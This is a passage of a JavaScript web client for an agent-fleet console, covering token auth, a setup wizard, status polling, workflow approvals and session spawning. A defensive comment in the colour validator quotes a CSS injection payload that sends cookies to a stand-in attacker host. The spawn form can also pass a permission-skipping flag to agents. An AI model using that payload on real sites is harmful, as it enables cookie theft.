'use strict';
// agent-fleet web client.
// Tactical command console. Vanilla JS, no framework. xterm.js for terminals.
(() => {
  const $ = (id) => document.getElementById(id);
  const state = {
    token: null,
    hosts: [],
    sessions: [],
    groups: [],           // [{id,name,description,color,host_ids}]
    cost: null,           // { days, hosts: [{host_id, host, usd, msgs}] }
    selected: null,       // session_id (when viewMode='session')
    selectedHost: null,   // host_id (when viewMode='host')
    viewMode: 'session',  // 'session' | 'host'
    ws: null,
    term: null,
    fit: null,
    pollTimer: null,
    backoff: 800,
  };
  // vt-0252: expose state to other modules (palette.js Cmd+K reads
  // window.fleetState.hosts/sessions for fuzzy autocomplete; vault.js
  // doesn't need this but follows the same convention via __vaultState).
  window.fleetState = state;

  // ============ Auth ============
  function readToken() {
    const frag = location.hash.match(/token=([^&]+)/);
    if (frag) {
      localStorage.fleetToken = decodeURIComponent(frag[1]);
      history.replaceState(null, '', location.pathname);
    }
    state.token = localStorage.fleetToken || null;
    // vt-0146/0147: vault.js + future tabs need the token + admin flag.
    // Dedicated /fleet/auth/whoami returns { role } as a clean 200.
    // The old probe was POST /fleet/dispatch with body={}, which left
    // a red 422 in DevTools and ran the dispatch validator on every
    // page load. whoami is a no-op DB-free check.
    if (state.token) {
      fetch('/api/fleet/auth/whoami', {
        headers: { authorization: 'Bearer ' + state.token },
      }).then(r => r.ok ? r.json() : { role: 'viewer' }).then(j => {
        state.isAdmin = j.role === 'admin';
        window.dispatchEvent(new CustomEvent('fleet-token-ready', { detail: { token: state.token, isAdmin: state.isAdmin } }));
      }).catch(() => {
        state.isAdmin = false;
        window.dispatchEvent(new CustomEvent('fleet-token-ready', { detail: { token: state.token, isAdmin: false } }));
      });
    }
  }
  function showAuth() {
    $('auth').hidden = false; $('app').hidden = true;
    $('token-save').onclick = () => {
      const v = $('token-input').value.trim();
      if (v) { localStorage.fleetToken = v; location.reload(); }
    };
    $('token-input').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') $('token-save').click();
    });
    setTimeout(() => $('token-input').focus(), 50);
    // vt-0220 → vt-0253: setup help link opens a step-by-step wizard so
    // operators can copy each command and tick it off before pasting the
    // token. State lives on the overlay element so closing wipes it.
    const help = $('setup-help');
    if (help) help.onclick = (ev) => { ev.preventDefault(); openSetupWizard(); };
  }
  // vt-0253: step-by-step setup wizard (replaces the single-screen modal).
  // Three steps + final paste-and-engage. Each step has a copy-able command.
  function openSetupWizard() {
    const overlay = document.createElement('div');
    overlay.className = 'app-dialog-overlay';
    const STEPS = 4;
    let cur = 1;
    const ESC_HTML = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
    function tr(k, fb) { return (window.fleetI18n ? window.fleetI18n.t(k) : '') || fb; }
    function escClose(e) { if (e.key === 'Escape') closeWizard(); }
    function closeWizard() {
      try { overlay.remove(); } catch {}
      document.removeEventListener('keydown', escClose);
    }
    function render() {
      const stepBody = renderStep(cur);
      const isFinal = cur === STEPS;
      overlay.innerHTML = `
        <div class="app-dialog-frame setup-wizard-frame">
          <div class="app-dialog-title">
            <span>${ESC_HTML(tr('setup.title', 'vault-rag setup'))}</span>
            <span style="float:right; font-weight:normal; color:var(--text-dim)">${cur}/${STEPS}</span>
          </div>
          <div class="setup-wizard-progress">
            ${Array.from({ length: STEPS }, (_, i) =>
              `<span class="setup-wizard-dot ${i + 1 <= cur ? 'on' : ''}"></span>`).join('')}
          </div>
          <div class="app-dialog-body">${stepBody}</div>
          <div class="app-dialog-buttons">
            <button class="btn-ghost" data-close>${ESC_HTML(tr('setup.btn.close', 'close'))}</button>
            <span style="flex:1"></span>
            ${cur > 1 ? `<button class="btn-ghost" data-back>${ESC_HTML(tr('setup.btn.back', '← back'))}</button>` : ''}
            ${!isFinal ? `<button class="btn-primary" data-next>${ESC_HTML(tr('setup.btn.next', 'next →'))}</button>` : ''}
            ${isFinal ? `<button class="btn-primary" data-engage>${ESC_HTML(tr('setup.btn.engage', 'engage'))}</button>` : ''}
          </div>
        </div>
      `;
      overlay.querySelectorAll('[data-copy]').forEach(b => {
        b.onclick = async () => {
          const txt = b.dataset.copy;
          try { await navigator.clipboard.writeText(txt); b.textContent = tr('setup.btn.copied', '✓ copied'); }
          catch { /* clipboard denied — operator can select manually */ }
        };
      });
      const next = overlay.querySelector('[data-next]');
      if (next) next.onclick = () => { cur = Math.min(STEPS, cur + 1); render(); };
      const back = overlay.querySelector('[data-back]');
      if (back) back.onclick = () => { cur = Math.max(1, cur - 1); render(); };
      overlay.querySelector('[data-close]').onclick = closeWizard;
      const eng = overlay.querySelector('[data-engage]');
      if (eng) eng.onclick = () => {
        const input = overlay.querySelector('#setup-wizard-token');
        const v = input && input.value.trim();
        if (!v) { input?.focus(); return; }
        localStorage.fleetToken = v;
        location.reload();
      };
      if (isFinal) setTimeout(() => overlay.querySelector('#setup-wizard-token')?.focus(), 50);
    }
    function renderStep(n) {
      if (n === 1) {
        const cmd = 'openssl rand -hex 32 | tee -a /opt/vault-rag/.env';
        return `
          <p><strong>${ESC_HTML(tr('setup.step1.title', '1. Generate a token'))}</strong></p>
          <p>${ESC_HTML(tr('setup.step1.body', 'Run this on the hub host. It appends a random 32-byte hex string to .env so it survives container restarts.'))}</p>
          <div class="setup-wizard-cmd">
            <pre>${ESC_HTML(cmd)}</pre>
            <button class="btn-ghost setup-wizard-copy" data-copy="${ESC_HTML(cmd)}">${ESC_HTML(tr('setup.btn.copy', 'copy'))}</button>
          </div>
          <p style="color:var(--text-dim)">${ESC_HTML(tr('setup.step1.note', 'Edit the appended line to read: VAULT_RAG_API_TOKEN=<the-hex>.'))}</p>
        `;
      }
      if (n === 2) {
        const cmd = 'docker compose -f /opt/vault-rag/docker-compose.yml up -d vault-rag-api';
        return `
          <p><strong>${ESC_HTML(tr('setup.step2.title', '2. Restart vault-rag-api'))}</strong></p>
          <p>${ESC_HTML(tr('setup.step2.body', 'Reload the new .env. Other containers (postgres, caddy) keep running.'))}</p>
          <div class="setup-wizard-cmd">
            <pre>${ESC_HTML(cmd)}</pre>
            <button class="btn-ghost setup-wizard-copy" data-copy="${ESC_HTML(cmd)}">${ESC_HTML(tr('setup.btn.copy', 'copy'))}</button>
          </div>
        `;
      }
      if (n === 3) {
        const cmd = 'openssl rand -hex 32  # use as VAULT_RAG_FLEET_ADMIN_TOKEN';
        return `
          <p><strong>${ESC_HTML(tr('setup.step3.title', '3. (Optional) Admin token'))}</strong></p>
          <p>${ESC_HTML(tr('setup.step3.body', 'For workflow runs, host PATCH, secret writes — set a separate admin token so the viewer bearer cannot perform mutating ops. Skip if you trust the same bearer everywhere.'))}</p>
          <div class="setup-wizard-cmd">
            <pre>${ESC_HTML(cmd)}</pre>
            <button class="btn-ghost setup-wizard-copy" data-copy="${ESC_HTML(cmd)}">${ESC_HTML(tr('setup.btn.copy', 'copy'))}</button>
          </div>
          <p style="color:var(--text-dim)">${ESC_HTML(tr('setup.step3.note', 'Append VAULT_RAG_FLEET_ADMIN_TOKEN=<hex> to .env, restart again, then paste this token in admin tools that require it.'))}</p>
        `;
      }
      return `
        <p><strong>${ESC_HTML(tr('setup.step4.title', '4. Paste the viewer token'))}</strong></p>
        <p>${ESC_HTML(tr('setup.step4.body', 'Token stays only in this browser localStorage. Rotate by repeating the steps and refreshing.'))}</p>
        <input id="setup-wizard-token" type="password" class="app-dialog-input" autocomplete="new-password"
               placeholder="${ESC_HTML(tr('setup.step4.placeholder', 'paste hex token here'))}">
      `;
    }
    overlay.onclick = (ev) => { if (ev.target === overlay) closeWizard(); };
    document.addEventListener('keydown', escClose);
    document.body.appendChild(overlay);
    render();
  }

  function showApp() {
    $('auth').hidden = true; $('app').hidden = false;
    $('logout').onclick = () => {
      if (!confirm('clear local token?')) return;
      localStorage.removeItem('fleetToken'); location.reload();
    };
  }

  // ============ API ============
  async function api(method, path, body) {
    const r = await fetch('/api/fleet' + path, {
      method, headers: {
        'authorization': 'Bearer ' + state.token,
        'content-type': 'application/json',
      },
      body: body ? JSON.stringify(body) : undefined,
    });
    if (r.status === 401) {
      // vt-0191: don't `location.reload()` — that destroys any in-progress
      // edit (5K-line note in the vault editor was being lost when autosave
      // hit an expired bearer). Open a re-auth dialog instead so the user
      // can paste a new token and continue from where they were.
      const newTok = await window.inputDialog({
        title: 'Session expired',
        message: 'Bearer token rejected. Paste a fresh token to resume — your in-progress edits stay in memory.',
        masked: true,
        confirmLabel: 'reconnect',
        cancelLabel: 'log out',
      });
      if (newTok) {
        localStorage.fleetToken = newTok;
        state.token = newTok;
        window.toast.success('reconnected — retry your action');
      } else {
        localStorage.removeItem('fleetToken');
        location.reload();
      }
      const err = new Error('auth');
      err.status = 401;
      throw err;
    }
    if (!r.ok) {
      const e = new Error(`${method} ${path}: ${r.status}`);
      e.status = r.status;
      try { e.body = await r.json(); } catch {}
      throw e;
    }
    if (r.status === 204) return null;
    return r.json();
  }

  // Optimistic-concurrency wrapper for group PATCH (vt-0087).
  // Returns updated row on success; on 409 conflict, alerts user, reloads
  // groups, and returns null so caller skips local mutation.
  async function patchGroupWithVersion(g, patch) {
    try {
      const updated = await api('PATCH', '/groups/' + g.id, { ...patch, expected_version: g.version });
      g.version = updated.version;
      return updated;
    } catch (e) {
      if (e.status === 409 && e.body && e.body.current) {
        alert('group was edited in another tab — reloading');
        loadGroups();
        return null;
      }
      throw e;
    }
  }

  // ============ Render ============
  function ageStr(iso) {
    if (!iso) return '—';
    const d = (Date.now() - new Date(iso).getTime()) / 1000;
    if (d < 60) return `${Math.floor(d)}s`;
    if (d < 3600) return `${Math.floor(d/60)}m`;
    if (d < 86400) return `${Math.floor(d/3600)}h${Math.floor((d%3600)/60).toString().padStart(2,'0')}`;
    return `${Math.floor(d/86400)}d`;
  }
  function humanSeconds(s) {
    s = Math.max(0, Math.floor(Number(s) || 0));
    const d = Math.floor(s / 86400); s %= 86400;
    const h = Math.floor(s / 3600);  s %= 3600;
    const m = Math.floor(s / 60);
    const parts = [];
    if (d) parts.push(d + 'd');
    if (h) parts.push(h + 'h');
    if (m && !d) parts.push(m + 'm');
    if (!parts.length) parts.push((s % 60) + 's');
    return parts.join(' ');
  }
  function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
  // vt-0182: validate a CSS color string before embedding into inline
  // style="...". esc() is HTML-attr safe but NOT CSS-safe — `red;
  // background-image:url(//attacker/${cookie})` would render and leak.
  // Accept only #rgb/#rgba/#rrggbb/#rrggbbaa. Reject everything else
  // (server should already validate, but defense-in-depth).
  function safeCssColor(s) {
    return /^#[0-9a-fA-F]{3,8}$/.test(String(s || '')) ? s : null;
  }
  function dotClass(status, kind) {
    if (kind === 'host') return status === 'online' ? 'on' : 'off';
    if (status === 'running') return 'on';
    if (status === 'orphaned' || status === 'pending') return 'warn';
    if (status === 'killed') return 'err';
    return 'off';
  }
  function short(id) { return id ? id.slice(0, 8) : '—'; }

  function render() {
    const online = state.hosts.filter(h => h.status === 'online').length;
    const active = state.sessions.filter(s => s.status === 'running').length;
    $('stat-hosts').textContent = state.hosts.length || '0';
    $('stat-online').textContent = online || '0';
    $('stat-active').textContent = active || '0';
    $('hosts-count').textContent = state.hosts.length;
    $('sessions-count').textContent = state.sessions.length;

    const hostsUl = $('hosts');
    const costByHost = {};
    if (state.cost) for (const h of state.cost.hosts) costByHost[h.host_id] = h.usd;
    hostsUl.innerHTML = state.hosts.length === 0
      ? `<li class="empty"><span class="dot off"></span><span class="host-name" style="color:var(--text-faint)">no hosts registered</span></li>`
      : state.hosts.map(h => {
          const n = state.sessions.filter(s => s.host_id === h.id && s.status === 'running').length;
          const cost = costByHost[h.id];
          const costStr = (cost != null) ? `$${cost.toFixed(2)}` : '—';
          const label = h.display_name || h.name;
          const active = (state.viewMode === 'host' && h.id === state.selectedHost) ? ' class="active"' : '';
          return `<li data-host="${h.id}"${active}>
            <span class="dot ${dotClass(h.status, 'host')}"></span>
            <span class="host-name">${esc(label)} <span class="host-count">· ${costStr}/7d</span></span>
            <span class="host-actions">
              <span class="host-count">${n} sess</span>
            </span>
          </li>`;
        }).join('');
    hostsUl.querySelectorAll('li[data-host]').forEach(li => {
      li.onclick = () => openHostDetail(li.dataset.host);
    });

    const sessUl = $('sessions');
    const showClosed = $('show-closed')?.checked;
    const sessVisible = state.sessions.filter(s => showClosed || (s.status !== 'exited' && s.status !== 'killed'));
    sessUl.innerHTML = sessVisible.length === 0
      ? `<li class="empty"><span class="dot off"></span><span class="sess-id" style="color:var(--text-faint)">no ${showClosed?'':'active '}sessions</span><span></span><span></span></li>`
      : sessVisible.slice(0, 40).map(s => {
          const host = state.hosts.find(h => h.id === s.host_id);
          const active = (state.viewMode === 'session' && s.id === state.selected) ? ' class="active"' : '';
          return `<li data-session="${s.id}"${active}>
            <span class="dot ${dotClass(s.status, 'session')}"></span>
            <span class="sess-id">${short(s.id)}</span>
            <span class="sess-host">${esc(host?.display_name || host?.name || '?')}</span>
            <span class="sess-age">${ageStr(s.started_at)}</span>
          </li>`;
        }).join('');

    // wire clicks
    sessUl.querySelectorAll('li[data-session]').forEach(li => {
      li.onclick = () => attachSession(li.dataset.session);
    });

    // spawn host options
    const hostSel = $('spawn-host');
    const cur = hostSel.value;
    hostSel.innerHTML = state.hosts
      .filter(h => h.status === 'online')
      .map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('')
      || `<option value="">no online hosts</option>`;
    if (cur && [...hostSel.options].some(o => o.value === cur)) hostSel.value = cur;

    const grpSel = $('spawn-group');
    if (grpSel) {
      const cur2 = grpSel.value;
      grpSel.innerHTML = '<option value="">(by tag instead)</option>' +
        state.groups.map(g => `<option value="${g.id}">${esc(g.name)}</option>`).join('');
      if (cur2 && [...grpSel.options].some(o => o.value === cur2)) grpSel.value = cur2;
    }

    // footbar
    $('footstat').textContent = `${state.hosts.length} hosts · ${state.sessions.length} sessions · ${active} active`;
  }

  // ============ Poll ============
  async function refresh() {
    try {
      const [hosts, sessions, groups] = await Promise.all([
        api('GET', '/hosts'), api('GET', '/sessions'), api('GET', '/groups'),
      ]);
      state.hosts = hosts;
      state.sessions = sessions;
      state.groups = groups;
      // cost is best-effort (503 if tokmon down); don't break refresh
      try {
        const cost = await api('GET', '/cost/summary?days=7');
        state.cost = cost;
        const total = cost.hosts.reduce((n, h) => n + (h.usd || 0), 0);
        $('stat-cost').textContent = `$${total.toFixed(2)}`;
      } catch (e) {
        state.cost = null;
        $('stat-cost').textContent = '—';
      }
      render();
      // vt-0110: pending approvals — best-effort, hidden if none.
      try { renderApprovals(await api('GET', '/workflow-pending-approvals')); }
      catch {}
      // vt-0115: docker stack health dot.
      try { renderStackStatus(await api('GET', '/stack-status')); }
      catch (e) { renderStackStatus({ services: [], error: e.message }); }
    } catch (e) {
      if (e.message !== 'auth') console.warn('refresh', e);
    }
  }
  // vt-0115 + vt-0261: compute green/yellow/red from per-service health
  // and expose a count for the visible chip.
  function summarizeStack(payload) {
    if (payload.error || !Array.isArray(payload.services)) {
      return { state: 'unknown', healthy: 0, total: 0, bad: [] };
    }
    let healthy = 0;
    const bad = [];
    for (const s of payload.services) {
      // The api container is always healthy if we can read the file;
      // otherwise the route 503'd and we never got here. Skip it from
      // the bad count so a freshly-restarting api doesn't flip the chip.
      if (s.name === 'vault-rag-api') { healthy++; continue; }
      if (s.status === 'running' && (s.health === 'healthy' || s.health === 'none')) healthy++;
      else bad.push(s);
    }
    const total = payload.services.length;
    let state;
    if (total === 0) state = 'unknown';
    else if (payload.stale) state = 'yellow';
    else if (bad.length === 0) state = 'green';
    else if (bad.length === 1) state = 'yellow';
    else state = 'red';
    return { state, healthy, total, bad };
  }
  function renderStackStatus(payload) {
    const dot = $('stack-dot');
    if (!dot) return;
    const sum = summarizeStack(payload);
    dot.dataset.state = sum.state;
    const textEl = dot.querySelector('.stack-dot-text');
    if (textEl) {
      textEl.textContent = sum.state === 'unknown'
        ? (payload.error ? 'STACK ?' : '—')
        : `${sum.healthy}/${sum.total}`;
    }
    dot.title = sum.state === 'green'   ? `STACK: all ${sum.total} containers healthy`
              : sum.state === 'yellow'  ? `STACK: ${sum.bad.length ? sum.bad.map(s => s.name).join(', ') + ' degraded' : 'status stale'}`
              : sum.state === 'red'     ? `STACK: ${sum.bad.length} unhealthy — ${sum.bad.map(s => s.name).join(', ')}`
              : (payload.error || 'stack status unavailable');
    dot.onclick = () => openStackModal(payload);
  }
  function openStackModal(payload) {
    const modal = $('stack-modal');
    if (!modal) return;
    modal.hidden = false;
    const rows = (payload.services || []).map(s => {
      const ok = s.status === 'running' && (s.health === 'healthy' || s.health === 'none');
      const ago = s.started_at ? relAgo(new Date(s.started_at).getTime()) : '—';
      return `<tr>
        <td>${esc(s.name)}</td>
        <td class="${ok ? 'val-ok' : 'val-danger'}">${esc(s.status)}${s.health && s.health !== 'none' ? ' / ' + esc(s.health) : ''}</td>
        <td>${ago}</td>
        <td>${s.restarts}</td>
      </tr>`;
    }).join('');
    const updated = payload.updated_at ? relAgo(new Date(payload.updated_at).getTime()) : '—';
    modal.innerHTML = `
      <div class="gd-frame" style="width:560px">
        <div class="gd-head">
          <span class="display" style="font-size:1.1em">DOCKER STACK</span>
          <span class="lbl" style="margin-left:1em">updated ${esc(updated)}${payload.stale ? ' · STALE' : ''}</span>
          <span style="flex:1"></span>
          <button class="btn-ghost" data-close>× close</button>
        </div>
        <div class="gd-body">
          ${payload.error ? `<p class="val-danger">${esc(payload.error)}</p>` : ''}
          <table class="archive-table">
            <thead><tr><th>name</th><th>status</th><th>uptime</th><th>restarts</th></tr></thead>
            <tbody>${rows || '<tr><td colspan="4" style="text-align:center; color:var(--text-faint)">no services reported</td></tr>'}</tbody>
          </table>
        </div>
      </div>
    `;
    modal.querySelector('[data-close]').onclick = () => { modal.hidden = true; };
  }
  function relAgo(ts) {
    const ms = Date.now() - ts;
    if (ms < 0) return new Date(ts).toLocaleString();
    const s = Math.floor(ms / 1000);
    if (s < 60)    return s + 's ago';
    if (s < 3600)  return Math.floor(s / 60) + 'm ago';
    if (s < 86400) return Math.floor(s / 3600) + 'h ago';
    return Math.floor(s / 86400) + 'd ago';
  }

  function renderApprovals(rows) {
    const panel = $('approvals-panel');
    const list = $('approvals-list');
    const countEl = $('approvals-count');
    if (!panel || !list) return;
    if (!rows || !rows.length) { panel.hidden = true; return; }
    panel.hidden = false;
    countEl.textContent = String(rows.length);
    list.innerHTML = rows.map(r => `
      <li class="approval-row" data-run="${esc(r.run_id)}" data-node="${esc(r.node_id)}">
        <div class="approval-head">
          <strong>${esc(r.workflow_name || r.run_id.slice(0, 8))}</strong>
          <span class="lbl">/${esc(r.node_id)}</span>
        </div>
        ${r.reason ? `<div class="approval-reason">${esc(r.reason)}</div>` : ''}
        <div class="approval-btns">
          <button class="btn-row" data-action="approve">approve</button>
          <button class="btn-row" data-action="reject">reject</button>
        </div>
      </li>`).join('');
    list.querySelectorAll('li.approval-row').forEach(li => {
      li.querySelectorAll('[data-action]').forEach(btn => {
        btn.onclick = async (ev) => {
          ev.stopPropagation();
          const decision = btn.dataset.action;
          try {
            await api('POST', `/workflow-runs/${li.dataset.run}/approvals/${li.dataset.node}`,
              { decision, by: 'web' });
            refresh();
          } catch (e) { alert(`approval failed: ${e.message}`); }
        };
      });
    });
  }
  function startPolling() {
    refresh();
    state.pollTimer = setInterval(refresh, 5000);
  }

  // ============ Terminal + WS ============
  function setViewerStatus(s) {
    const map = { running: 'val-ok', exited: '', killed: 'val-danger', orphaned: 'val-warn', pending: 'val-warn', reconnecting: 'val-warn' };
    const el = $('v-status');
    el.textContent = s || 'idle';
    el.className = 'val ' + (map[s] || '');
    state.viewerStatusValue = s;
    // Dim terminal during reconnect so the freeze is visually obvious.
    const tf = document.querySelector('.term-frame');
    if (tf) tf.classList.toggle('term-reconnecting', s === 'reconnecting');
  }
  function setOverlay(_visible, _msg, _sub) {
    // vt-0392 v2: live xterm dropped → no term-overlay in DOM. Empty
    // state is rendered inside chat-view itself (waiting for first msg)
    // and the raw transcript pre carries its own placeholder text.
  }

  function setViewMode(mode) {
    state.viewMode = mode;
    document.querySelector('.viewer').hidden = (mode !== 'session');
    document.querySelector('.host-detail').hidden = (mode !== 'host');
    // R10: when leaving session view, stop polling cost for the now-hidden
    // session — otherwise it runs forever until next attachSession() call.
    if (mode !== 'session' && state.sessionCostTimer) {
      clearInterval(state.sessionCostTimer);
      state.sessionCostTimer = null;
    }
  }

  function attachSession(id) {
    if (state.ws) { try { state.ws.close(); } catch {} state.ws = null; }
    if (state.term) { try { state.term.dispose(); } catch {} state.term = null; }
    if (state.sessionCostTimer) { clearInterval(state.sessionCostTimer); state.sessionCostTimer = null; }
    if (state.ro) { try { state.ro.disconnect(); } catch {} state.ro = null; }
    // vt-0392 (Phase 1C, MED fix): detach chat-view before binding to a new
    // session so in-flight frames for the previous session don't render into
    // the new view between ws close and ws open.
    try { window.chatView?.detach(); } catch {}
    // Reset static-transcript so it re-fetches when raw tab is opened.
    _lastTranscriptSid = null;
    const xt = $('static-transcript-xterm');
    if (xt) xt.dataset.loaded = '';
    state.selected = id;
    state.selectedHost = null;
    setViewMode('session');
    document.querySelector('.viewer').classList.remove('exited');
    render();

    $('v-id').textContent = short(id);
    $('v-host').textContent = '…';
    $('v-cwd').textContent = '…';
    $('v-cost').textContent = '—';
    setViewerStatus('attaching');
    setOverlay(false);

    // Per-session cost: refresh every 10s while attached
    const refreshSessCost = async () => {
      try {
        const c = await api('GET', `/sessions/${id}/cost`);
        const usd = (c.usd || 0).toFixed(4);
        const tag = c.attribution === 'approximate' ? ' ~' : '';
        let tip = `attribution: ${c.attribution || 'unknown'}`;
        if (c.by_model) {
          for (const [m, v] of Object.entries(c.by_model)) {
            tip += `\n${m}: $${v.usd.toFixed(4)} (${v.msgs} msgs, in=${v.input_tokens}, out=${v.output_tokens}, cache_w=${v.cache_creation_5m}, cache_r=${v.cache_read})`;
          }
        }
        const el = $('v-cost');
        el.textContent = `$${usd}${tag} · ${c.msgs} msgs`;
        el.title = tip;
      } catch { $('v-cost').textContent = '—'; }
    };
    refreshSessCost();
    state.sessionCostTimer = setInterval(refreshSessCost, 10_000);

    $('v-kill').disabled = false;
    $('v-kill').onclick = async () => {
      if (!confirm('terminate this session?')) return;
      try { await api('POST', `/sessions/${id}/kill`, {}); } catch (e) { alert(e.message); }
    };

    // vt-0392 v2: live xterm dropped — fleet attaches via chat-view only.
    // Raw transcript is a static post-hoc view fetched on demand (see
    // refreshStaticTranscript). connectWs still opens the WS for chat
    // frames + control + lifecycle.
    state.term = null;
    state.fitAddon = null;
    connectWs(id);
  }

  // vt-0136: short-lived signed ticket replaces bearer-in-subprotocol so the
  // raw token no longer lands in DevTools / reverse-proxy logs. Falls back to
  // legacy bearer.<token> if the server doesn't ship the ws-ticket endpoint
  // yet (rolling upgrade).
  async function fetchWsTicket(role = 'viewer', scopeId = '') {
    try {
      const r = await fetch('/api/fleet/auth/ws-ticket', {
        method: 'POST',
        headers: { 'authorization': 'Bearer ' + state.token, 'content-type': 'application/json' },
        body: JSON.stringify({ role, scope_id: scopeId }),
      });
      if (!r.ok) return null;
      const j = await r.json();
      return j.ticket || null;
    } catch { return null; }
  }

  async function connectWs(id) {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${proto}//${location.host}/api/fleet/ws?role=viewer&session_id=${id}`;
    // H4: bind ticket to this session_id — server rejects upgrade if the
    // ticket is replayed against a different session within its 60s TTL.
    const ticket = await fetchWsTicket('viewer', id);
    const subProto = ticket ? ['ticket.' + ticket] : ['bearer.' + state.token];
    const ws = new WebSocket(url, subProto);
    state.ws = ws;
    ws.onopen = () => {
      state.backoff = 800;
      // If we were in reconnecting mode, clear the dim. Real status will arrive
      // via the 'hello' frame; meanwhile show 'attaching' as transient.
      if (state.viewerStatusValue === 'reconnecting') setViewerStatus('attaching');
      // vt-0392 (Phase 1C): hook chat-view to this WS so it fires
      // replay_request and starts ingesting structured frames.
      try {
        const stored = localStorage.getItem(`chatOffset:${id}`);
        window.chatView?.attach(id, ws, { fromOffset: stored ? Number(stored) : 0 });
      } catch {}
    };
    ws.onmessage = (e) => {
      let f;
      try { f = JSON.parse(e.data); } catch { return; }
      if (f.type === 'hello') {
        const host = state.hosts.find(h => h.id === f.host_id);
        $('v-host').textContent = host?.display_name || host?.name || short(f.host_id);
        $('v-cwd').textContent = f.cwd || '—';
        setViewerStatus(f.status);
      } else if (f.type === 'claude_msg' || f.type === 'compact_boundary'
                 || f.type === 'replay_batch' || f.type === 'session_lifecycle') {
        // vt-0392 (Phase 1C): route structured frames to chat-view.
        try { window.chatView?.handleFrame(f); } catch (e) { console.warn('chatView.handleFrame', e); }
      } else if (f.type === 'session_exit') {
        document.querySelector('.viewer').classList.add('exited');
        setViewerStatus(f.exit_code === 0 ? 'exited' : 'killed');
      } else if (f.type === 'session_started') {
        setViewerStatus('running');
      }
      // pty_data / backfill / pty_gap intentionally ignored: live xterm
      // was retired (vt-0392 v2). Raw output is viewable via the
      // RAW TRANSCRIPT tab which fetches /sessions/:id/transcript.txt.
    };
    ws.onclose = (ev) => {
      if (ev.code === 4001) {
        localStorage.removeItem('fleetToken'); location.reload(); return;
      }
      // vt-0392 (Phase 1C): persist chat offset so reconnect skips already-seen frames.
      try {
        const off = window.chatView?.getLastOffset?.();
        if (off) localStorage.setItem(`chatOffset:${id}`, String(off));
      } catch {}
      if (state.selected === id) {
        // Don't override terminal-state-flagged statuses with 'reconnecting'.
        const v = state.viewerStatusValue;
        if (v !== 'exited' && v !== 'killed') setViewerStatus('reconnecting');
        const wait = Math.min(state.backoff *= 1.7, 8000);
        setTimeout(() => connectWs(id), wait);
      } else {
        state.backoff = 800;
      }
    };
    ws.onerror = () => { /* let close handler retry */ };
  }
  // vt-0392 v3: raw transcript view rendered via read-only xterm.js so
  // ANSI escape codes (cursor movement, color, spinner overdraw) replay
  // correctly. Earlier `<pre>` mode showed every animation frame stacked
  // vertically because the cursor-back escapes were stripped.
  let _lastTranscriptSid = null;
  let _staticTerm = null;
  let _staticFit = null;
  function ensureStaticTerm() {
    if (_staticTerm) return _staticTerm;
    const host = $('static-transcript-xterm');
    if (!host) return null;
    host.classList.remove('static-transcript-empty');
    host.textContent = '';
    _staticTerm = new Terminal({
      fontFamily: '"JetBrains Mono", ui-monospace, monospace',
      fontSize: 12, lineHeight: 1.3, scrollback: 100000,
      cursorBlink: false, disableStdin: true, convertEol: false,
      theme: {
        background: '#000', foreground: '#e8e6e1', cursor: '#5cf08c',
        black:'#0a0a0c', red:'#ff4d5e', green:'#5cf08c', yellow:'#ffb547',
        blue:'#6fd5ff', magenta:'#ff79c6', cyan:'#8be9fd', white:'#e8e6e1',
        brightBlack:'#5a5550', brightRed:'#ff7d8b', brightGreen:'#86ffac',
        brightYellow:'#ffd07a', brightBlue:'#9be4ff', brightMagenta:'#ffaae0',
        brightCyan:'#bbf3ff', brightWhite:'#ffffff',
      },
      allowProposedApi: true,
    });
    _staticFit = new FitAddon.FitAddon();
    _staticTerm.loadAddon(_staticFit);
    try { if (window.CanvasAddon?.CanvasAddon) _staticTerm.loadAddon(new CanvasAddon.CanvasAddon()); } catch {}
    try {
      if (window.Unicode11Addon?.Unicode11Addon) {
        _staticTerm.loadAddon(new Unicode11Addon.Unicode11Addon());
        _staticTerm.unicode.activeVersion = '11';
      }
    } catch {}
    _staticTerm.open(host);
    return _staticTerm;
  }
  function fitStaticTerm() {
    if (!_staticFit) return;
    try { _staticFit.fit(); } catch {}
  }
  async function refreshStaticTranscript(sid, opts = {}) {
    const host = $('static-transcript-xterm');
    const meta = $('static-transcript-meta');
    if (!host) return;
    if (!opts.force && _lastTranscriptSid === sid && host.dataset.loaded === '1') return;
    _lastTranscriptSid = sid;
    if (meta) meta.textContent = 'loading…';
    try {
      const res = await fetch(`/api/fleet/sessions/${encodeURIComponent(sid)}/transcript.bin`, {
        headers: { 'authorization': 'Bearer ' + state.token },
      });
      if (!res.ok) {
        host.textContent = `// transcript fetch failed: HTTP ${res.status}`;
        host.classList.add('static-transcript-empty');
        return;
      }
      const buf = new Uint8Array(await res.arrayBuffer());
      const term = ensureStaticTerm();
      if (!term) return;
      term.reset();
      requestAnimationFrame(() => {
        fitStaticTerm();
        term.write(buf);
        if (meta) meta.textContent = `${buf.length.toLocaleString()} bytes`;
        host.dataset.loaded = '1';
      });
    } catch (e) {
      host.textContent = `// transcript fetch error: ${e.message}`;
      host.classList.add('static-transcript-empty');
    }
  }

  function b64ToBytes(b64) {
    const bin = atob(b64);
    const u = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
    return u;
  }

  // ============ Spawn ============
  function parseArgs(s) {
    if (!s) return [];
    const out = []; const re = /'([^']*)'|"([^"]*)"|(\S+)/g;
    let m; while ((m = re.exec(s))) out.push(m[1] ?? m[2] ?? m[3]);
    return out;
  }
  // Build claude CLI argv from the spawn form.
  // Order: explicit flags first, then user-provided extras (so extras can override).
  function buildSpawnArgs(extras) {
    const model    = $('spawn-model').value.trim();
    const system   = $('spawn-system').value.trim();
    const tools    = $('spawn-tools').value.trim();
    const resume   = $('spawn-resume').value.trim();
    const danger   = $('spawn-dangerous').checked;
    const args = [];
    if (model)  args.push('--model', model);
    if (system) args.push('--append-system-prompt', system);
    if (tools)  args.push('--allowed-tools', tools);
    if (resume) args.push('--resume', resume);
    if (danger) args.push('--dangerously-skip-permissions');
    return args.concat(extras);
  }
  async function spawn() {
    const btn = $('spawn-btn');
    if (btn.disabled) return; // R5: ignore rapid re-fires while a spawn is in flight
